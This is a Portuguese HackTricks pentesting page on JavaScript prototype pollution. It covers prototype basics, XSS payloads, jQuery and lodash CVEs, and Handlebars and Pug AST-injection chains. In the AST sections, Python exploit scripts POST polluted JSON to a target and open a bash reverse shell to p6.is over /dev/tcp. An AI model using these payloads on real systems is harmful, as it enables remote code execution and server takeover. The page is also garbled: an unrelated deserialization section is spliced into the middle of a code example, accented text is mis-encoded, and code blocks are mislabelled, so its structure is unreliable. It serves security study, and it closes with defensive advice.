# NodeJS - \_\_proto\_\_ e prototype Pollution

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Objetos em JavaScript <a href="#053a" id="053a"></a>

Antes de tudo, precisamos entender o `Object` em JavaScript. Um objeto √© simplesmente uma cole√ß√£o de pares de chave e valor, frequentemente chamados de propriedades desse objeto. Por exemplo:

![](<../../../.gitbook/assets/image (389) (1).png>)

Em JavaScript, `Object` √© um objeto b√°sico, o modelo para todos os objetos rec√©m-criados. √â poss√≠vel criar um objeto vazio passando `null` para `Object.create`. No entanto, o objeto rec√©m-criado tamb√©m ter√° um tipo que corresponde ao par√¢metro passado e herda todas as propriedades b√°sicas.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Anteriormente, aprendemos que um objeto em javascript √© uma cole√ß√£o de chaves e valores, ent√£o faz sentido que um objeto `null` seja apenas um dicion√°rio vazio: `{}`.

## Fun√ß√µes / Classes em Javascript <a href="#55dd" id="55dd"></a>

Em Javascript, os conceitos de classe e fun√ß√£o s√£o bastante inter-relacionados (a pr√≥pria fun√ß√£o age como o construtor da classe e a natureza real n√£o tem conceito de "classe" em javascript). Vamos ver o seguinte exemplo:
```javascript
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}
```
# Deserializa√ß√£o Perigosa em Node.js: Polui√ß√£o de Prot√≥tipo

## Descri√ß√£o

A polui√ß√£o de prot√≥tipo √© uma vulnerabilidade de deserializa√ß√£o que permite que um invasor adicione ou modificar propriedades de um objeto em tempo de execu√ß√£o. Isso pode levar a uma variedade de ataques, como a execu√ß√£o remota de c√≥digo (RCE), a escalada de privil√©gios e a divulga√ß√£o de informa√ß√µes confidenciais.

Essa vulnerabilidade ocorre quando um aplicativo Node.js desserializa dados de entrada sem validar adequadamente seu conte√∫do. Um invasor pode enviar dados maliciosos que incluem propriedades especiais que afetam o prot√≥tipo do objeto desserializado. Isso pode levar a uma polui√ß√£o de prot√≥tipo, onde o invasor pode adicionar ou modificar propriedades do objeto que n√£o deveriam ser modificadas.

## Detalhes T√©cnicos

A polui√ß√£o de prot√≥tipo pode ocorrer em objetos JavaScript que possuem um prot√≥tipo mut√°vel. Isso inclui objetos criados com a fun√ß√£o `Object.create()` e fun√ß√µes construtoras personalizadas que definem propriedades no prot√≥tipo do objeto.

Um invasor pode explorar essa vulnerabilidade enviando dados maliciosos que incluem propriedades especiais, como `__proto__` ou `constructor`, que afetam o prot√≥tipo do objeto desserializado. Isso pode levar a uma polui√ß√£o de prot√≥tipo, onde o invasor pode adicionar ou modificar propriedades do objeto que n√£o deveriam ser modificadas.

## Exemplo de Ataque

Considere o seguinte c√≥digo Node.js que desserializa dados JSON de entrada:

```javascript
const data = JSON.parse(req.body);
```

Se o objeto JSON de entrada contiver uma propriedade `__proto__`, um invasor pode adicionar ou modificar propriedades do prot√≥tipo do objeto desserializado:

```json
{
  "__proto__": {
    "admin": true
  }
}
```

Isso adicionaria uma propriedade `admin` ao prot√≥tipo do objeto desserializado, permitindo que o invasor acesse recursos restritos ou execute c√≥digo arbitr√°rio com privil√©gios elevados.

## Solu√ß√£o

Para evitar a polui√ß√£o de prot√≥tipo, √© importante validar cuidadosamente todos os dados de entrada que s√£o desserializados em objetos JavaScript. Isso pode incluir a valida√ß√£o de tipos de dados, a filtragem de propriedades indesejadas e a utiliza√ß√£o de bibliotecas de desserializa√ß√£o seguras.

Al√©m disso, √© recomend√°vel evitar o uso de objetos mut√°veis com prot√≥tipos personalizados em aplicativos Node.js. Em vez disso, considere o uso de objetos imut√°veis ou objetos com prot√≥tipos nativos que n√£o podem ser modificados.
```javascript
var person1 = new person("Satoshi", 70);
```
## Prot√≥tipos em JavaScript <a href="#3843" id="3843"></a>

Uma coisa a se notar √© que o atributo prototype pode ser alterado/modificado/exclu√≠do durante a execu√ß√£o do c√≥digo. Por exemplo, fun√ß√µes da classe podem ser adicionadas dinamicamente:

![](<../../../.gitbook/assets/image (363).png>)

Fun√ß√µes da classe tamb√©m podem ser modificadas (como `toString` ou `valueOf` nos seguintes casos):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Heran√ßa

Em um programa baseado em prot√≥tipos, objetos herdam propriedades/m√©todos de classes. As classes s√£o derivadas adicionando propriedades/m√©todos a uma inst√¢ncia de outra classe ou adicionando-os a um objeto vazio.

Observe que, se voc√™ adicionar uma propriedade a um objeto que √© usado como prot√≥tipo para um conjunto de objetos (como o myPersonObj), os objetos para os quais ele √© o prot√≥tipo tamb√©m receber√£o a nova propriedade, mas essa propriedade n√£o ser√° impressa a menos que seja especificamente chamada.

![](<../../../.gitbook/assets/image (366).png>)

## Polui√ß√£o de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Voc√™ j√° deve ter aprendido que **cada objeto em JavaScript √© simplesmente uma cole√ß√£o de pares chave-valor** e que **cada objeto herda do tipo Object em JavaScript**. Isso significa que, se voc√™ puder poluir o tipo Object, **cada objeto JavaScript do ambiente ser√° polu√≠do!**

Isso √© bastante simples, voc√™ s√≥ precisa ser capaz de modificar algumas propriedades (pares chave-valor) de um objeto JavaScript arbitr√°rio, porque como cada objeto herda de Object, cada objeto pode acessar o esquema Object.
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
Do exemplo anterior, √© poss√≠vel acessar a estrutura do objeto usando as seguintes maneiras:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Ent√£o, como mencionado anteriormente, se uma propriedade for adicionada ao esquema do objeto, todos os objetos JavaScript ter√£o acesso √† nova propriedade:
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Agora cada objeto JS conter√° as novas propriedades: a fun√ß√£o `printHello` e a nova constante `globalconstant`.

## polui√ß√£o de prot√≥tipo

Essa t√©cnica n√£o √© t√£o eficaz quanto a anterior, pois voc√™ n√£o pode poluir o esquema do objeto JS. Mas em casos em que a **palavra-chave `__proto__` √© proibida, essa t√©cnica pode ser √∫til**.

Se voc√™ puder modificar as propriedades de uma fun√ß√£o, poder√° modificar a propriedade `prototype` da fun√ß√£o e **cada nova propriedade que voc√™ adicionar aqui ser√° herdada por cada objeto criado a partir dessa fun√ß√£o:**
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
Neste caso, apenas os **objetos criados a partir da classe `person`** ser√£o afetados, mas cada um deles agora **herdar√° as propriedades `sayHello` e `newConstant`**.

Existem **2 maneiras de abusar da polui√ß√£o de prot√≥tipos para contaminar TODOS os objetos JS**.

A primeira seria poluir o prot√≥tipo da propriedade do **Object** (como mencionado anteriormente, todos os objetos JS herdam deste):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Se voc√™ conseguir fazer isso, cada objeto JS ser√° capaz de executar a fun√ß√£o `sayBye`.

Outra maneira √© poluir o prot√≥tipo de um construtor de uma vari√°vel de dicion√°rio como no exemplo a seguir:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Depois de executar esse c√≥digo, **cada objeto JS ser√° capaz de executar a fun√ß√£o `sayHey`**.

## Poluindo outros objetos

### De uma classe para Object.prototype

Em um cen√°rio onde voc√™ pode **poluir um objeto espec√≠fico** e precisa **chegar a `Object.prototype`**, voc√™ pode procur√°-lo com algo como o seguinte c√≥digo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key)
  }
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
  for(let key2 in document.querySelector('a')[key1]) {
    if (document.querySelector('a')[key1][key2] === window) {
      console.log(key1 + "." + key2)
    }
  }
}
```
### Polui√ß√£o de elementos de array

Observe que, assim como √© poss√≠vel poluir atributos de objetos em JS, se voc√™ tiver acesso para poluir um array, tamb√©m pode **poluir valores do array** acess√≠veis **por √≠ndices** (observe que voc√™ n√£o pode sobrescrever valores, ent√£o √© necess√°rio poluir √≠ndices que s√£o de alguma forma usados, mas n√£o escritos).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Polui√ß√£o de elementos HTML

Ao gerar um elemento HTML via JS, √© poss√≠vel **sobrescrever** o atributo **`innerHTML`** para escrever **c√≥digo HTML arbitr√°rio**. [Idea e exemplo deste writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemplos

### Exemplo B√°sico

Ent√£o, onde est√° a polui√ß√£o de prot√≥tipos? Isso acontece quando h√° um bug na aplica√ß√£o que torna poss√≠vel sobrescrever propriedades de `Object.prototype`. Como todo objeto t√≠pico herda suas propriedades de `Object.prototype`, podemos mudar o comportamento da aplica√ß√£o. O exemplo mais comumente mostrado √© o seguinte:
```javascript
if (user.isAdmin) {   // do something important!}
```
Imagine que temos uma polui√ß√£o de prot√≥tipo que torna poss√≠vel definir `Object.prototype.isAdmin = true`. Ent√£o, a menos que a aplica√ß√£o atribua explicitamente algum valor, `user.isAdmin` ser√° sempre verdadeiro!

Por exemplo, `obj[a][b] = value`. Se o atacante puder controlar o valor de `a` e `value`, ent√£o ele s√≥ precisa ajustar o valor de `a` para `__proto__` (em javascript, `obj["__proto__"]` e `obj.__proto__` s√£o completamente equivalentes) ent√£o a propriedade `b` de todos os objetos existentes na aplica√ß√£o ser√° atribu√≠da a `value`.

No entanto, o ataque n√£o √© t√£o simples como o acima, de acordo com [paper](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), s√≥ podemos atacar quando uma das seguintes tr√™s condi√ß√µes for atendida:

* Realizar mesclagem recursiva
* Defini√ß√£o de propriedade por caminho
* Clonar objeto

### Substituir fun√ß√£o
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution para RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Proto Pollution do lado do cliente para XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de proto pollution atrav√©s do jQuery $ .extend

$ .extend, se manipulado incorretamente, pode alterar as propriedades do objeto `prototype` (o modelo dos objetos no aplicativo). Este atributo aparecer√° em todos os objetos. Observe que apenas a vers√£o "profunda" (ou seja, g) do $ .extened √© afetada.

Os programadores frequentemente usam essa fun√ß√£o para duplicar um objeto ou preencher novas propriedades a partir de um objeto padr√£o. Por exemplo:

Podemos imaginar que `myObject` √© um campo de entrada do usu√°rio e √© serializado no BD.

Neste c√≥digo, frequentemente pensamos que, ao executar, atribuir√° o atributo `isAdmin` ao objeto rec√©m-criado. Mas essencialmente, ele √© atribu√≠do diretamente a `{}` e, em seguida, `{}.isAdmin` ser√° `true`. Se ap√≥s este c√≥digo, realizarmos a seguinte verifica√ß√£o:
```javascript
If (user.isAdmin === true) {
    // do something for admin
}
```
Se o usu√°rio ainda n√£o existir (`undefined`), a propriedade `isAdmin` ser√° procurada em seu objeto pai, que √© o objeto adicionado `isAdmin` com o valor `true` acima.

Outro exemplo quando executado no JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Esses erros podem afetar muitos projetos Javascript, especialmente projetos NodeJS, o exemplo mais pr√°tico √© o erro no Mongoose, a biblioteca JS que ajuda a manipular o MongoDB, em dezembro de 2018.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do lodash

[Lodash](https://www.npmjs.com/package/lodash) tamb√©m √© uma biblioteca bem conhecida que fornece muitas fun√ß√µes diferentes, ajudando-nos a escrever c√≥digo de forma mais conveniente e organizada, com mais de 19 milh√µes de downloads semanais. E ele teve o mesmo problema que o JQuery.

**CVE-2018‚Äì3721**

**CVE-2019‚Äì10744**

Este bug afeta todas as vers√µes do Lodash, j√° corrigido na vers√£o 4.17.11.

### Outro tutorial com CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## AST Prototype Pollution

No NodeJS, o AST √© usado no JS com muita frequ√™ncia, como motores de modelo e typescript etc.\
Para o motor de modelo, a estrutura √© mostrada acima.

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

Informa√ß√µes retiradas de [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

Voc√™ pode inserir qualquer string em `Object.prototype.pendingContent` para determinar a possibilidade de um ataque.\
Isso permite que voc√™ tenha certeza de que os servidores est√£o usando o motor handlebars quando uma polui√ß√£o de prot√≥tipo existe em um ambiente de caixa preta.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
	if (this.pendingContent) {
		content = this.pendingContent + content;
	} else {
		this.pendingLocation = this.source.currentLocation;
	}

	this.pendingContent = content;
},
pushSource: function pushSource(source) {
	if (this.pendingContent) {
		this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
		this.pendingContent = undefined;
	}

	if (source) {
		this.source.push(source);
	}
}
...
```
Isso √© feito pela fun√ß√£o `appendContent` do arquivo `javascript-compiler.js`. `appendContent` √© o seguinte: se `pendingContent` estiver presente, anexa ao conte√∫do e retorna.

`pushSource` torna o `pendingContent` indefinido, impedindo que a string seja inserida v√°rias vezes.

**Explora√ß√£o**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebars funcionam como mostrado no gr√°fico acima.

Ap√≥s o lexer e o parser gerarem o AST, ele √© passado para o `compiler.js`. Podemos executar a fun√ß√£o de modelo que o compilador gerou com alguns argumentos. E ele retorna a string como "Hello posix" (quando msg √© posix).
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
    this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
    break;
```
O analisador em handlebars for√ßa o valor de um n√≥ cujo tipo √© NumberLiteral a ser sempre um n√∫mero atrav√©s do construtor Number. No entanto, voc√™ pode inserir uma string n√£o num√©rica aqui usando a polui√ß√£o de prot√≥tipo.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
  // Just return if an already-compiled AST was passed in.
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;

  // Altering the shared object here, but this is ok as parser is a sync operation
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);

  return ast;
}

function parse(input, options) {
  var ast = parseWithoutProcessing(input, options);
  var strip = new _whitespaceControl2['default'](options);

  return strip.accept(ast);
}
```
Primeiro, olhe para a fun√ß√£o de compila√ß√£o, que suporta duas formas de entrada, o objeto AST e a string de modelo.

Quando o tipo de entrada √© um `Program`, embora o valor de entrada seja uma string. O parser considera que j√° foi analisado pelo parser.js e o envia para o compilador sem nenhum processamento.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
    /* istanbul ignore next: Sanity code */
    if (!this[node.type]) {
        throw new _exception2['default']('Unknown type: ' + node.type, node);
    }

    this.sourceNode.unshift(node);
    var ret = this[node.type](node);
    this.sourceNode.shift();
    return ret;
},
Program: function Program(program) {
    console.log((new Error).stack)
    this.options.blockParams.unshift(program.blockParams);

    var body = program.body,
        bodyLength = body.length;
    for (var i = 0; i < bodyLength; i++) {
        this.accept(body[i]);
    }

    this.options.blockParams.shift();

    this.isSimple = bodyLength === 1;
    this.blockParams = program.blockParams ? program.blockParams.length : 0;

    return this;
}
```
O compilador recebe o objeto AST (na verdade, uma string) e o envia para o m√©todo `accept`.\
E `accept` chama `this[node.type]` do compilador.\
Em seguida, o atributo body do AST √© usado para construir a fun√ß√£o.
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
            return parent[propertyName];
        }
        return undefined
    };

    return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
        "name": "undefined",
        "hash": {},
        "data": data,
        "loc": {
            "start": 0,
            "end": 0
        }
    })) != null ? stack1 : "");
}
*/
```
Como resultado, um ataque pode ser configurado da seguinte forma. Se voc√™ passou pelo analisador, especifique uma string que n√£o pode ser atribu√≠da ao valor de NumberLiteral. Mas, se o AST injetado for processado, podemos inserir qualquer c√≥digo na fun√ß√£o.

**Exemplo**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)
```
### Pug

Mais informa√ß√µes em [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)
```
## O que posso fazer para prevenir?

* Congele as propriedades com Object.freeze (Object.prototype)
* Realize valida√ß√£o nas entradas JSON de acordo com o esquema da aplica√ß√£o
* Evite usar fun√ß√µes de mesclagem recursiva de maneira insegura
* Use objetos sem propriedades de prot√≥tipo, como `Object.create(null)`, para evitar afetar a cadeia de prot√≥tipos
* Use `Map` em vez de `Object`
* Atualize regularmente novos patches para bibliotecas

## Refer√™ncia

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
